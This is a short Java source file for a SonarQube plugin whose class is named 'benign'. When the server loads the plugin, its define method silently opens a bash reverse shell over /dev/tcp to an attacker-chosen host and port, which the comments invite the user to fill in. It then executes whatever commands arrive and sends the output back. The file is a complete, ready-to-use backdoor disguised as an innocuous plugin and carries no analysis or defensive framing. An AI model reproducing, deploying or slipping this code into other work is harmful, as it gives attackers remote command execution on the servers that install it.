import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import static java.util.Arrays.asList;
import org.sonar.api.Plugin;
import org.sonar.api.config.PropertyDefinition;

public class benign implements Plugin {
  @Override
  public void define(Context context) {
    String lhost = "127.0.0.1"; // specify your attack host here
    int lport = 1337;           // specify a listening port here
    try {
      revshell(lhost, lport);
    }
      catch (Exception e){
    }
  }
  public void revshell(String host, int port) throws Exception {
    String[] cmd = new String[3];
    cmd[0] = "/bin/bash";
    cmd[1] = "-c";
    cmd[2] = "exec 5<>/dev/tcp/" + host + "/" + port + ";cat <&5 | while read line; do $line 2>&5 >&5; done";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
  }
}
